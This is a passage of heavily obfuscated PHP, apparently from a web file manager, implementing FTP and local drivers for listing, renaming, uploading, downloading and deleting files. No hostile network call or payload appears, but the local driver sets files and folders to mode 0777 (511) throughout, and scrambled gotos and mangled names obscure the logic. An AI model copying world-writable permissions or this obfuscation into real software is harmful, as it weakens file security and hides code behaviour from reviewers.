$díñ™Ø•∏∫) { $díñ™Ø•∏∫ = $this->iconvSystem($díñ™Ø•∏∫); $D®™ëùÚ‰€ = @ftp_rmdir($this->connect, $díñ™Ø•∏∫); if (!$D®™ëùÚ‰€) { return !1; } } $D™åµÔææà = $this->iconvSystem($D™åµÔææà); return @ftp_rmdir($this->connect, $D™åµÔææà); goto fÔÎ·“£»⁄; fÔÎ·“£»⁄: } public function rename($CÍ€˜Ëﬂïõ, $Aê—ì≥Ë≈•) { goto D∑ïŸÇ“Í…; f«íÇøÕåÜ: $eñ»˘éÑóÃ = $this->iconvSystem($eñ»˘éÑóÃ); $CÍ€˜Ëﬂïõ = $this->iconvSystem($CÍ€˜Ëﬂïõ); $cÆ∆çä¿û‘ = $this->pathFather($CÍ€˜Ëﬂïõ); goto C–„†åí◊„; C–„†åí◊„: $F«ÛêºƒÓÈ = rtrim($cÆ∆çä¿û‘, $eƒ÷ï¬Ìì[8]) . $eƒ÷ï¬Ìì[8] . $eñ»˘éÑóÃ; $f¶£ßÿÚ‰ú = @ftp_rename($this->connect, $CÍ€˜Ëﬂïõ, $F«ÛêºƒÓÈ); $F«ÛêºƒÓÈ = $this->iconvApp($F«ÛêºƒÓÈ); goto DÛì“ì™…ô; DÛì“ì™…ô: return $f¶£ßÿÚ‰ú ? $this->getPathOuter($F«ÛêºƒÓÈ) : !1; goto FÊ◊√ôÉ˘√; D∑ïŸÇ“Í…: $eƒ÷ï¬Ìì =& $_SERVER[™⁄»üÆ]; if (!$this->_isconn()) { return !1; } $eñ»˘éÑóÃ = $this->fileNameAuto($this->pathFather($CÍ€˜Ëﬂïõ), $Aê—ì≥Ë≈•); goto f«íÇøÕåÜ; FÊ◊√ôÉ˘√: } private function folderInfo($AÙıÂß ı«, $f–™É•øÈŸ = false) { $Fê‰«ÀÙƒØ =& $_SERVER[™⁄»üÆ]; $fÌƒê∑ÜÍ® = array($Fê‰«ÀÙƒØ[28] => $this->pathThis($AÙıÂß ı«), $Fê‰«ÀÙƒØ[76] => $this->getPathOuter($Fê‰«ÀÙƒØ[8] . $AÙıÂß ı«), $Fê‰«ÀÙƒØ[29] => $Fê‰«ÀÙƒØ[77]); if ($f–™É•øÈŸ) { return $fÌƒê∑ÜÍ®; } $fÌƒê∑ÜÍ®[$Fê‰«ÀÙƒØ[194]] = $fÌƒê∑ÜÍ®[$Fê‰«ÀÙƒØ[84]] = 0; $fÌƒê∑ÜÍ®[$Fê‰«ÀÙƒØ[195]] = $fÌƒê∑ÜÍ®[$Fê‰«ÀÙƒØ[196]] = !0; return $fÌƒê∑ÜÍ®; } private function fileInfo($A´‡ì™ùüª, $A‹µèÁÎê™ = false, $Dáå—∏ÖÇÏ = array()) { goto C…„àñà∂€; F≥Ïè™Ì¥ë: return $d‡°Ç¶˜Óä; goto E¶©Ñö«Ñé; fø∂∆ÌÈÍ…: $d‡°Ç¶˜Óä[$bÎÿÉ∫íã≈[84]] = @ftp_mdtm($this->connect, $dâêêÌÂãÎ); if (empty($Dáå—∏ÖÇÏ)) { $Dáå—∏ÖÇÏ = $this->objectMeta($A´‡ì™ùüª); if (!$Dáå—∏ÖÇÏ) { return $d‡°Ç¶˜Óä; } } $d‡°Ç¶˜Óä[$bÎÿÉ∫íã≈[78]] = $Dáå—∏ÖÇÏ[$bÎÿÉ∫íã≈[78]]; goto F≥Ïè™Ì¥ë; Dôæ©öÿËÉ: $d‡°Ç¶˜Óä[$bÎÿÉ∫íã≈[194]] = $d‡°Ç¶˜Óä[$bÎÿÉ∫íã≈[84]] = 0; $d‡°Ç¶˜Óä[$bÎÿÉ∫íã≈[195]] = $d‡°Ç¶˜Óä[$bÎÿÉ∫íã≈[196]] = !0; $dâêêÌÂãÎ = $this->iconvSystem($A´‡ì™ùüª); goto fø∂∆ÌÈÍ…; C…„àñà∂€: $bÎÿÉ∫íã≈ =& $_SERVER[™⁄»üÆ]; $d‡°Ç¶˜Óä = array($bÎÿÉ∫íã≈[28] => $this->pathThis($A´‡ì™ùüª), $bÎÿÉ∫íã≈[76] => $this->getPathOuter($bÎÿÉ∫íã≈[8] . $A´‡ì™ùüª), $bÎÿÉ∫íã≈[29] => $bÎÿÉ∫íã≈[193], $bÎÿÉ∫íã≈[78] => isset($Dáå—∏ÖÇÏ[$bÎÿÉ∫íã≈[78]]) ? $Dáå—∏ÖÇÏ[$bÎÿÉ∫íã≈[78]] : 0, $bÎÿÉ∫íã≈[168] => $this->ext($A´‡ì™ùüª)); if ($A‹µèÁÎê™) { return $d‡°Ç¶˜Óä; } goto Dôæ©öÿËÉ; E¶©Ñö«Ñé: } public function size($a—°€ÇÆåƒ) { $D†èò ¿Ï„ = $this->objectMeta($a—°€ÇÆåƒ); return $D†èò ¿Ï„ ? $D†èò ¿Ï„[$_SERVER[™⁄»üÆ][78]] : 0; } public function info($f∑ò§‚ºóö) { if ($this->isFile($f∑ò§‚ºóö)) { return $this->fileInfo($f∑ò§‚ºóö, 0); } else { if ($this->isFolder($f∑ò§‚ºóö)) { return $this->folderInfo($f∑ò§‚ºóö); } } return !1; } private function fileList($d˘È¿‚êÑ±, &$A£÷ó¯î§À, &$A¯ËÚòÏ”≤, $eŸ“èÍêïÇ = false) { goto aÃèÚÑ®¿‹; b…˜Ô∫–ëΩ: @ftp_chdir($this->connect, $Dâ·É√©∆≥[8]); $d˘È¿‚êÑ± = rtrim($d˘È¿‚êÑ±, $Dâ·É√©∆≥[8]) . $Dâ·É√©∆≥[8]; check_abort(); goto A’π˘ä˘†¥; a‚ªÈÑâËç: $Fœ”ê—„è£ = array($Dâ·É√©∆≥[95] => 1, $Dâ·É√©∆≥[1260] => 1); foreach ($eÛ®ç‘É¥• as $e’ÃÔ—ˆﬁâ) { goto cú—–≥å∏Œ; Cñ⁄ı™ƒç≥: if ($E•ûüºÑ») { $A£÷ó¯î§À[] = $Bá¨¬™†æé; if ($eŸ“èÍêïÇ) { $this->fileList($Bá¨¬™†æé, $A£÷ó¯î§À, $A¯ËÚòÏ”≤, $eŸ“èÍêïÇ); } continue; } $A¯ËÚòÏ”≤[] = $Cä≤áá≠ÉÑ; goto bó©πΩ™∂á; déç§ü»Ì∏: if (empty($Bá¨¬™†æé) && $Bá¨¬™†æé !== $Dâ·É√©∆≥[191] || isset($Fœ”ê—„è£[$Bá¨¬™†æé])) { continue; } $Bá¨¬™†æé = $this->iconvApp($d˘È¿‚êÑ± . ltrim($Bá¨¬™†æé, $Dâ·É√©∆≥[8])); $Cä≤áá≠ÉÑ = array($Dâ·É√©∆≥[28] => $Bá¨¬™†æé, $Dâ·É√©∆≥[29] => $Dâ·É√©∆≥[193], $Dâ·É√©∆≥[78] => $A…¥Ñµ∏ñå[4]); goto a‡ªÕ¬•ﬁï; a‡ªÕ¬•ﬁï: if (substr($e’ÃÔ—ˆﬁâ, 0, 1) == $Dâ·É√©∆≥[1261]) { $Cä≤áá≠ÉÑ[$Dâ·É√©∆≥[29]] = $Dâ·É√©∆≥[77]; $Cä≤áá≠ÉÑ[$Dâ·É√©∆≥[78]] = 0; } $E•ûüºÑ» = $Cä≤áá≠ÉÑ[$Dâ·É√©∆≥[29]] == $Dâ·É√©∆≥[77] ? !0 : !1; if ($AÀ—€Çıå∫) { $this->cacheMethod($Dâ·É√©∆≥[199], $Bá¨¬™†æé, $E•ûüºÑ»); $this->cacheMethod($Dâ·É√©∆≥[200], $Bá¨¬™†æé, $Cä≤áá≠ÉÑ); } goto Cñ⁄ı™ƒç≥; cú—–≥å∏Œ: $A…¥Ñµ∏ñå = $this->_listItem($e’ÃÔ—ˆﬁâ); if ($A…¥Ñµ∏ñå[0] == $Dâ·É√©∆≥[738]) { continue; } $Bá¨¬™†æé = $A…¥Ñµ∏ñå[8]; goto déç§ü»Ì∏; bó©πΩ™∂á: } if ($AÀ—€Çıå∫) { $this->cacheMethod($Dâ·É√©∆≥[199], $d˘È¿‚êÑ±, !0); } goto CÌ—‰ôﬂ™Â; A’π˘ä˘†¥: $AÀ—€Çıå∫ = $this->listItemCache === !1 ? !1 : !0; $eÛ®ç‘É¥• = @ftp_rawlist($this->connect, $d˘È¿‚êÑ±); if (!$eÛ®ç‘É¥•) { $eÛ®ç‘É¥• = array(); } goto a‚ªÈÑâËç; aÃèÚÑ®¿‹: $Dâ·É√©∆≥ =& $_SERVER[™⁄»üÆ]; $d˘È¿‚êÑ± = $this->iconvSystem($d˘È¿‚êÑ±); if (!$this->isFolder($d˘È¿‚êÑ±)) { return !1; } goto b…˜Ô∫–ëΩ; CÌ—‰ôﬂ™Â: } private function _listItem($c‘£∞‚ƒÉ≈) { if (empty($c‘£∞‚ƒÉ≈)) { return array(); } $BÇ’Ò´√◊≤ = preg_split($_SERVER[™⁄»üÆ][1262], $c‘£∞‚ƒÉ≈); if (count($BÇ’Ò´√◊≤) <= 9) { return $BÇ’Ò´√◊≤; } $BÇ’Ò´√◊≤[8] = trim(substr($c‘£∞‚ƒÉ≈, strpos($c‘£∞‚ƒÉ≈, $BÇ’Ò´√◊≤[7]) + strlen($BÇ’Ò´√◊≤[7]))); return array_splice($BÇ’Ò´√◊≤, 0, 9); } public function listPath($B›∑‡¶ø–∞, $A´◊¨‘«è = false) { goto c≈àÚπø≠‚; c≈àÚπø≠‚: $c©÷≈éÎ›Ñ =& $_SERVER[™⁄»üÆ]; if (!$this->_isconn()) { return !1; } $a‘®∑¥…á‘ = $a¡âÇºêπ« = array(); goto C∂∆Ûàê⁄∫; C∂∆Ûàê⁄∫: $this->fileList($B›∑‡¶ø–∞, $a‘®∑¥…á‘, $a¡âÇºêπ«); foreach ($a‘®∑¥…á‘ as $c©Ã¶–æ∂ => $Dü‘ﬁÁúÏÔ) { $a‘®∑¥…á‘[$c©Ã¶–æ∂] = $this->folderInfo($Dü‘ﬁÁúÏÔ, $A´◊¨‘«è); } foreach ($a¡âÇºêπ« as $c©Ã¶–æ∂ => $Dü‘ﬁÁúÏÔ) { $a¡âÇºêπ«[$c©Ã¶–æ∂] = $this->fileInfo($Dü‘ﬁÁúÏÔ[$c©÷≈éÎ›Ñ[28]], $A´◊¨‘«è, $Dü‘ﬁÁúÏÔ); } goto c¶…µ‰«ﬁº; c¶…µ‰«ﬁº: return array($c©÷≈éÎ›Ñ[75] => $a‘®∑¥…á‘, $c©÷≈éÎ›Ñ[74] => $a¡âÇºêπ«); goto EïÁè˘òø∞; EïÁè˘òø∞: } public function has($aå±è–’∫, $Eå“≈Ú¬ıÊ = false, $f´åÉÊ™ﬂÓ = true) { goto f˜ç…›ááÖ; fáê∞„ŒÁç: return !1; goto b√€Ìçà∞⁄; bÂÂ±¡É°ø: $this->fileList($aå±è–’∫, $D•ﬂñ≤¢ÜÎ, $e‘âìÜù÷ö, $Eí‡™§á¿‰); if ($Eå“≈Ú¬ıÊ) { return array($C÷ıÕ»Æ∫å[203] => count($e‘âìÜù÷ö), $C÷ıÕ»Æ∫å[204] => count($D•ﬂñ≤¢ÜÎ)); } if ($f´åÉÊ™ﬂÓ) { if (count($e‘âìÜù÷ö)) { return !0; } } else { if (count($D•ﬂñ≤¢ÜÎ)) { return !0; } } goto fáê∞„ŒÁç; f˜ç…›ááÖ: $C÷ıÕ»Æ∫å =& $_SERVER[™⁄»üÆ]; $D•ﬂñ≤¢ÜÎ = $e‘âìÜù÷ö = array(); $Eí‡™§á¿‰ = $Eå“≈Ú¬ıÊ ? !0 : !1; goto bÂÂ±¡É°ø; b√€Ìçà∞⁄: } public function listAll($D¶Úó°á¢¶) { goto b¥ïËÁˆﬁñ; FÕº°µπë‘: foreach ($D‚àÔóé–Ë as $EõŸŸ¿†Á∫) { if (is_string($EõŸŸ¿†Á∫)) { $Añ¿¢ÒÈ§⁄[$EõŸŸ¿†Á∫] = 0; } } return $this->listAllFiles($D¶Úó°á¢¶, array_keys($Añ¿¢ÒÈ§⁄), $Añ¿¢ÒÈ§⁄); goto a€Ì¢Ã∫≤´; Dî∆ú¨ªÆ≈: $this->fileList($D¶Úó°á¢¶, $D‚àÔóé–Ë, $d—Ù‡ï’©˜, !0); $Añ¿¢ÒÈ§⁄ = array(); foreach ($d—Ù‡ï’©˜ as $EõŸŸ¿†Á∫) { $Añ¿¢ÒÈ§⁄[$EõŸŸ¿†Á∫[$açô‡¡›à∂[28]]] = $EõŸŸ¿†Á∫[$açô‡¡›à∂[78]]; } goto FÕº°µπë‘; b¥ïËÁˆﬁñ: $açô‡¡›à∂ =& $_SERVER[™⁄»üÆ]; if (!$this->_isconn()) { return !1; } $D‚àÔóé–Ë = $d—Ù‡ï’©˜ = array(); goto Dî∆ú¨ªÆ≈; a€Ì¢Ã∫≤´: } public function getContent($EÕ√ÃΩúºñ) { if (!$this->_isconn()) { return !1; } $EÕ√ÃΩúºñ = $this->iconvSystem($EÕ√ÃΩúºñ); return $this->fileSubstr($EÕ√ÃΩúºñ); } public function setContent($CΩÃ∑ñäÏ∫, $EÂÌÊ˘÷Üÿ = '') { goto DíÈ∫ƒ¬ÈÉ; FÂ»øñ¯õ: return $EÂÓﬂ§ªùà; goto d∫†Ú¬≤¥±; DíÈ∫ƒ¬ÈÉ: if (!$this->_isconn()) { return !1; } $dºƒ§«êÎ∆ = $this->pathThis($this->iconvSystem($CΩÃ∑ñäÏ∫)); $dÑ‡õÊÑàû = $this->tempFile($dºƒ§«êÎ∆); goto b®ãû…é”ú; b®ãû…é”ú: file_put_contents($dÑ‡õÊÑàû, $EÂÌÊ˘÷Üÿ); $EÂÓﬂ§ªùà = $this->upload($CΩÃ∑ñäÏ∫, $this->iconvApp($dÑ‡õÊÑàû)); $this->tempFileRemve($dÑ‡õÊÑàû); goto FÂ»øñ¯õ; d∫†Ú¬≤¥±: } public function fileSubstr($c–Ù©‘ı°‘, $Aá≠¨âŒ∂ï = 0, $aÖ»úÒ™ﬁ∏ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($c–Ù©‘ı°‘, $Aá≠¨âŒ∂ï, $aÖ»úÒ™ﬁ∏); } private function ftpRequest($E◊ÛîΩ´àŸ, $a≥ó•ãëïè = 0, $e‹⁄÷∏Ûèº = false) { goto fÇ¿ï˘‰†Û; a‚ÎûÖØ—Ë: curl_setopt($d©∏ä≠°±Ÿ, CURLOPT_URL, $c∆ó˜ê®‘Ô . $this->pathEncode($E◊ÛîΩ´àŸ)); curl_setopt($d©∏ä≠°±Ÿ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($e‹⁄÷∏Ûèº) { $E–ô⁄ùÎÛÕ = $a≥ó•ãëïè + $e‹⁄÷∏Ûèº - 1; curl_setopt($d©∏ä≠°±Ÿ, CURLOPT_RANGE, "{$a≥ó•ãëïè}\x2d{$E–ô⁄ùÎÛÕ}"); } goto dﬂ›Î°ûŸπ; dﬂ›Î°ûŸπ: curl_setopt($d©∏ä≠°±Ÿ, CURLOPT_RETURNTRANSFER, 1); $f¥¨¢ÁÊÉÔ = curl_exec($d©∏ä≠°±Ÿ); curl_close($d©∏ä≠°±Ÿ); goto aÌ⁄ﬂÆ£–ä; aÌ⁄ﬂÆ£–ä: return $f¥¨¢ÁÊÉÔ; goto bú≤ùÙÌŸ‹; fÇ¿ï˘‰†Û: $E◊ÛîΩ´àŸ = $this->iconvSystem($E◊ÛîΩ´àŸ); $c∆ó˜ê®‘Ô = $this->scheme . $this->host . $_SERVER[™⁄»üÆ][4] . $this->port; $d©∏ä≠°±Ÿ = curl_init(); goto a‚ÎûÖØ—Ë; bú≤ùÙÌŸ‹: } public function upload($FﬂøÕàœØ±, $dÏÊ÷ì•¬Ü, $BÇ◊Ê≥‹˜ñ = false, $a—´ùÃç∑ê = REPEAT_REPLACE) { goto d˘¨®Ôø‡î; d©ÔΩé“√ú: $dÏÊ÷ì•¬Ü = $this->iconvSystem($dÏÊ÷ì•¬Ü); $eåµπùˆ® = ftp_nb_put($this->connect, $FﬂøÕàœØ±, $dÏÊ÷ì•¬Ü, FTP_BINARY); while ($eåµπùˆ® == FTP_MOREDATA) { $eåµπùˆ® = ftp_nb_continue($this->connect); } goto D∆„êÈ®®Ü; D∆„êÈ®®Ü: if ($eåµπùˆ® != FTP_FINISHED) { return !1; } return $this->getPathOuter($FﬂøÕàœØ±); goto eûê°Ôâﬂá; d˘¨®Ôø‡î: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($FﬂøÕàœØ±))) { return !1; } $FﬂøÕàœØ± = $this->iconvSystem($FﬂøÕàœØ±); goto d©ÔΩé“√ú; eûê°Ôâﬂá: } public function download($aúØûÂæ¡¥, $F∫Ç˘Ü°Éµ = '') { goto Bï∏ Ö©∏ˆ; Bï∏ Ö©∏ˆ: if (!$this->_isconn()) { return !1; } $f‰æà∑”òì = $this->pathFather($F∫Ç˘Ü°Éµ); if (!IO::mkdir($f‰æà∑”òì)) { return !1; } goto Aã°ÑÒ“ã»; f≥Ö∑Ëâ¯˜: while ($a¯Û¨ñÙ˘À == FTP_MOREDATA) { $a¯Û¨ñÙ˘À = ftp_nb_continue($this->connect); } if ($a¯Û¨ñÙ˘À != FTP_FINISHED) { return !1; } return $this->iconvApp($F∫Ç˘Ü°Éµ); goto f◊√Û™îéÒ; Aã°ÑÒ“ã»: $aúØûÂæ¡¥ = $this->iconvSystem($aúØûÂæ¡¥); $F∫Ç˘Ü°Éµ = $this->iconvSystem($F∫Ç˘Ü°Éµ); $a¯Û¨ñÙ˘À = ftp_nb_get($this->connect, $F∫Ç˘Ü°Éµ, $aúØûÂæ¡¥, FTP_BINARY); goto f≥Ö∑Ëâ¯˜; f◊√Û™îéÒ: } public function exist($a±»†ºªÚå) { return $this->isFile($a±»†ºªÚå) || $this->isFolder($a±»†ºªÚå); } public function isFile($D◊¢„ ‰™≠) { return !$this->isFolder($D◊¢„ ‰™≠) && $this->objectMeta($D◊¢„ ‰™≠); } public function isFolder($aŒÔ©ãÒ‚ú) { return $this->cacheMethod($_SERVER[™⁄»üÆ][199], $aŒÔ©ãÒ‚ú); } protected function objectMeta($b√õ…∏ﬁ∑ ) { return $this->cacheMethod($_SERVER[™⁄»üÆ][200], $b√õ…∏ﬁ∑ ); } protected function _objectMeta($aÖöíæ≤˘ö) { goto EÜ∏ó’⁄›Ü; e‰ÙÎ„›ïë: $aÖöíæ≤˘ö = $this->iconvSystem($aÖöíæ≤˘ö); $dñæ‚œ·à≈ = array($eÎ‹§ŸØú€[28] => $this->iconvApp($aÖöíæ≤˘ö), $eÎ‹§ŸØú€[29] => $eÎ‹§ŸØú€[193], $eÎ‹§ŸØú€[78] => 0); @ftp_chdir($this->connect, $eÎ‹§ŸØú€[8]); goto eèÃ◊Â∑òÖ; eèÃ◊Â∑òÖ: $aÑó’ﬁÑﬂË = @ftp_size($this->connect, $aÖöíæ≤˘ö); if ($aÑó’ﬁÑﬂË != -1) { $dñæ‚œ·à≈[$eÎ‹§ŸØú€[78]] = $aÑó’ﬁÑﬂË; } else { $cÎ∏«¡èúÑ = @ftp_chdir($this->connect, $aÖöíæ≤˘ö); if (!$cÎ∏«¡èúÑ) { return !1; } $dñæ‚œ·à≈[$eÎ‹§ŸØú€[29]] = $eÎ‹§ŸØú€[77]; } return $dñæ‚œ·à≈; goto F‹˜®–…Èä; EÜ∏ó’⁄›Ü: $eÎ‹§ŸØú€ =& $_SERVER[™⁄»üÆ]; if ($aÖöíæ≤˘ö == $eÎ‹§ŸØú€[33] || $aÖöíæ≤˘ö == $eÎ‹§ŸØú€[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto e‰ÙÎ„›ïë; F‹˜®–…Èä: } protected function _isFolder($DˆÚ•ñâËÃ) { $dí¿€∞å≠ã =& $_SERVER[™⁄»üÆ]; if ($DˆÚ•ñâËÃ == $dí¿€∞å≠ã[33] || $DˆÚ•ñâËÃ == $dí¿€∞å≠ã[8]) { return !0; } $F¬¥´èà·ò = $this->_objectMeta($DˆÚ•ñâËÃ); return isset($F¬¥´èà·ò[$dí¿€∞å≠ã[29]]) && $F¬¥´èà·ò[$dí¿€∞å≠ã[29]] == $dí¿€∞å≠ã[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($EÍ‡©Ú˘∂€) { if (substr($EÍ‡©Ú˘∂€, 0, 2) == $_SERVER[™⁄»üÆ][1253]) { $EÍ‡©Ú˘∂€ = BASIC_PATH . substr($EÍ‡©Ú˘∂€, 2); } return $EÍ‡©Ú˘∂€; } public function iconvApp($fÕ·Ó∑È ä) { $f∞¿ì÷‚ü» =& $_SERVER[™⁄»üÆ]; global $config; return $this->iconvTo($fÕ·Ó∑È ä, $config[$f∞¿ì÷‚ü»[1251]], $config[$f∞¿ì÷‚ü»[1250]]); } public function iconvSystem($C≤⁄ÉÿÆ¡´) { $fâ’…›à∑ı =& $_SERVER[™⁄»üÆ]; global $config; return $this->iconvTo($C≤⁄ÉÿÆ¡´, $config[$fâ’…›à∑ı[1250]], $config[$fâ’…›à∑ı[1251]]); } public function getPathOuter($Bª÷¨≥æÓß) { goto E∫‘•â©¥Ñ; fÛ»ÕÒ—∑ª: return $this->pathDriver . $e§◊ó•ÜÓ¬[8] . ltrim($Bª÷¨≥æÓß, $e§◊ó•ÜÓ¬[8]); goto c¿ãú’¿ªŸ; E∫‘•â©¥Ñ: $e§◊ó•ÜÓ¬ =& $_SERVER[™⁄»üÆ]; $bì‹£’∑∏Ü = $this->iconvApp($this->pathBase); $Bª÷¨≥æÓß = $this->iconvApp($Bª÷¨≥æÓß); goto C«Ü—‹„”î; eÍ—Í£àìá: $Bª÷¨≥æÓß = KodIO::clear($Bª÷¨≥æÓß); $Bª÷¨≥æÓß = substr($Bª÷¨≥æÓß, strlen($bì‹£’∑∏Ü)); if (empty($this->pathDriver)) { return $Bª÷¨≥æÓß; } goto fÛ»ÕÒ—∑ª; C«Ü—‹„”î: if (substr($bì‹£’∑∏Ü, 0, 2) == $e§◊ó•ÜÓ¬[1253]) { $bì‹£’∑∏Ü = BASIC_PATH . substr($bì‹£’∑∏Ü, 2); } if (substr($Bª÷¨≥æÓß, 0, 2) == $e§◊ó•ÜÓ¬[1253]) { $Bª÷¨≥æÓß = BASIC_PATH . substr($Bª÷¨≥æÓß, 2); } $bì‹£’∑∏Ü = KodIO::clear($bì‹£’∑∏Ü); goto eÍ—Í£àìá; c¿ãú’¿ªŸ: } public function mkfile($cπÜ¨∑áŒˆ, $cÃäÃ£‘ıÑ = '', $aŒÙä¨…ÔΩ = REPEAT_RENAME) { $cπÜ¨∑áŒˆ = $this->iconvSystem($cπÜ¨∑áŒˆ); @touch($cπÜ¨∑áŒˆ); if ($cÃäÃ£‘ıÑ) { file_put_contents($cπÜ¨∑áŒˆ, $cÃäÃ£‘ıÑ); } @chmod($cπÜ¨∑áŒˆ, 511); return is_file($cπÜ¨∑áŒˆ) ? $this->getPathOuter($cπÜ¨∑áŒˆ) : !1; } public function mkdir($D†≠†£Ì‹”, $B•®§∏”ä≠ = REPEAT_SKIP) { $D†≠†£Ì‹” = $this->iconvSystem($D†≠†£Ì‹”); if (is_dir($D†≠†£Ì‹”)) { return $this->getPathOuter($D†≠†£Ì‹”); } @mkdir($D†≠†£Ì‹”, 511, !0); @chmod($D†≠†£Ì‹”, 511); return is_dir($D†≠†£Ì‹”) ? $this->getPathOuter($D†≠†£Ì‹”) : !1; } public function copyFile($BÉé“·£ƒª, $f”Ã¬±¨çƒ) { $this->mkdir($this->pathFather($f”Ã¬±¨çƒ)); $BÉé“·£ƒª = $this->iconvSystem($BÉé“·£ƒª); $f”Ã¬±¨çƒ = $this->iconvSystem($f”Ã¬±¨çƒ); $F¨ºØèåôç = copy_64($BÉé“·£ƒª, $f”Ã¬±¨çƒ); @chmod($f”Ã¬±¨çƒ, 511); return $F¨ºØèåôç ? $this->getPathOuter($f”Ã¬±¨çƒ) : !1; } public function moveFile($BÒÉèô—Ã, $e“Ì›ç≤¿ã) { goto Dèàƒñ˘ı°; Dèàƒñ˘ı°: $this->mkdir($this->pathFather($e“Ì›ç≤¿ã)); $BÒÉèô—Ã = $this->iconvSystem($BÒÉèô—Ã); $e“Ì›ç≤¿ã = $this->iconvSystem($e“Ì›ç≤¿ã); goto C◊Ë≤Ç÷øÀ; dñ±‹≤©™æ: return $CÕ¡‰ÑÆ∂Í ? $this->getPathOuter($e“Ì›ç≤¿ã) : !1; goto CÜ›ÊÖÈ∑“; C◊Ë≤Ç÷øÀ: $CÕ¡‰ÑÆ∂Í = intval(@rename($BÒÉèô—Ã, $e“Ì›ç≤¿ã)); if (!$CÕ¡‰ÑÆ∂Í) { if ($CÕ¡‰ÑÆ∂Í = intval(@copy_64($BÒÉèô—Ã, $e“Ì›ç≤¿ã))) { @unlink($BÒÉèô—Ã); } } @chmod($e“Ì›ç≤¿ã, 511); goto dñ±‹≤©™æ; CÜ›ÊÖÈ∑“: } public function delFile($b´É©ﬁ•Í») { $b´É©ﬁ•Í» = $this->iconvSystem($b´É©ﬁ•Í»); if (!@unlink($b´É©ﬁ•Í»)) { @chmod($b´É©ﬁ•Í», 511); if (!@unlink($b´É©ﬁ•Í»)) { return !1; } } else { return !0; } } public function delFolder($Cà¡·™õ—ﬁ) { goto aŸè⁄Ò¨Ëé; aŒÃ–Ωﬁîô: return rmdir($Cà¡·™õ—ﬁ); goto DÖêóä€ﬂ±; aŸè⁄Ò¨Ëé: $FÒı≤ëíÜ§ =& $_SERVER[™⁄»üÆ]; $Cà¡·™õ—ﬁ = $this->iconvSystem($Cà¡·™õ—ﬁ); if (!is_dir($Cà¡·™õ—ﬁ)) { return !0; } goto dÈéºÔ˘‹˘; dÈéºÔ˘‹˘: if (!($f§÷ÍØ⁄Ã— = opendir($Cà¡·™õ—ﬁ))) { return !1; } while (($AÃπ∏Ñ√»¶ = readdir($f§÷ÍØ⁄Ã—)) !== !1) { if ($AÃπ∏Ñ√»¶ == $FÒı≤ëíÜ§[95] || $AÃπ∏Ñ√»¶ == $FÒı≤ëíÜ§[1260]) { continue; } $b…ΩÒÿÇ†Æ = $Cà¡·™õ—ﬁ . $FÒı≤ëíÜ§[8] . $AÃπ∏Ñ√»¶; if (is_file($b…ΩÒÿÇ†Æ) || is_link($b…ΩÒÿÇ†Æ)) { if (!unlink($b…ΩÒÿÇ†Æ)) { chmod($b…ΩÒÿÇ†Æ, 511); if (!unlink($b…ΩÒÿÇ†Æ)) { return !1; } } } else { if (is_dir($b…ΩÒÿÇ†Æ)) { chmod($b…ΩÒÿÇ†Æ, 511); $b…ΩÒÿÇ†Æ = $this->iconvApp($b…ΩÒÿÇ†Æ); if (!$this->delFolder($b…ΩÒÿÇ†Æ)) { return !1; } } } } closedir($f§÷ÍØ⁄Ã—); goto aŒÃ–Ωﬁîô; DÖêóä€ﬂ±: } public function rename($F¨Í≈ÎÇã, $a¢é∑“°îá) { goto fÈ ≤ÿò“; d≠≤ô„á¨Æ: $aŸå√ƒáåæ = @rename($F¨Í≈ÎÇã, $b≈íÍ¯≤Œ‚); $b≈íÍ¯≤Œ‚ = $this->iconvApp($b≈íÍ¯≤Œ‚); return $aŸå√ƒáåæ ? $this->getPathOuter($b≈íÍ¯≤Œ‚) : !1; goto A¥£∂îÖä÷; Aè›ßÀÏü±: $F¨Í≈ÎÇã = $this->iconvSystem($F¨Í≈ÎÇã); $eπÒìó®‹Ù = $this->pathFather($F¨Í≈ÎÇã); $b≈íÍ¯≤Œ‚ = rtrim($eπÒìó®‹Ù, $C∂…Ñ¡Á◊„[8]) . $C∂…Ñ¡Á◊„[8] . $bˆ◊È…êò¬; goto d≠≤ô„á¨Æ; fÈ ≤ÿò“: $C∂…Ñ¡Á◊„ =& $_SERVER[™⁄»üÆ]; $bˆ◊È…êò¬ = $this->fileNameAuto($this->pathFather($F¨Í≈ÎÇã), $a¢é∑“°îá); $bˆ◊È…êò¬ = $this->iconvSystem($bˆ◊È…êò¬); goto Aè›ßÀÏü±; A¥£∂îÖä÷: } public function size($AÈ¨¶‚∂°‚) { $AÈ¨¶‚∂°‚ = $this->iconvSystem($AÈ¨¶‚∂°‚); return filesize_64($AÈ¨¶‚∂°‚); } public function info($a∞’åÃèäê) { $a∞’åÃèäê = $this->iconvSystem($a∞’åÃèäê); if ($this->isFolder($a∞’åÃèäê)) { return $this->folderInfo($a∞’åÃèäê); } else { if ($this->isFile($a∞’åÃèäê)) { return $this->fileInfo($a∞’åÃèäê); } } return !1; } protected function infoChildren($Eâ¨È”øîé, &$fëç„Ì¯≥Ï, $A™ˆ∆ùıô˜ = true) { goto a◊ÂöÉ√Î; BÔü›¿à™ê: if ($A™ˆ∆ùıô˜) { $Eâ¨È”øîé = $this->iconvSystem($Eâ¨È”øîé); } if (!($E—äø‘°ÒÛ = @opendir($Eâ¨È”øîé))) { return; } while (($d∂„„ÜÀØ‹ = readdir($E—äø‘°ÒÛ)) !== !1) { if ($d∂„„ÜÀØ‹ == $dä≈‹ñ≈á™[95] || $d∂„„ÜÀØ‹ == $dä≈‹ñ≈á™[1260]) { continue; } $A¯˜ﬂ¨Ãóä = $Eâ¨È”øîé . $d∂„„ÜÀØ‹; if (is_file($A¯˜ﬂ¨Ãóä) || is_link($A¯˜ﬂ¨Ãóä)) { $fëç„Ì¯≥Ï[$dä≈‹ñ≈á™[79]]++; $fëç„Ì¯≥Ï[$dä≈‹ñ≈á™[78]] += filesize_64($A¯˜ﬂ¨Ãóä); } else { if (is_dir($A¯˜ﬂ¨Ãóä)) { $fëç„Ì¯≥Ï[$dä≈‹ñ≈á™[80]]++; $this->infoChildren($A¯˜ﬂ¨Ãóä, $fëç„Ì¯≥Ï, !1); } } } goto BÜÂ¢òÕÑÓ; BÜÂ¢òÕÑÓ: closedir($E—äø‘°ÒÛ); goto FÁøÚ Œ£É; 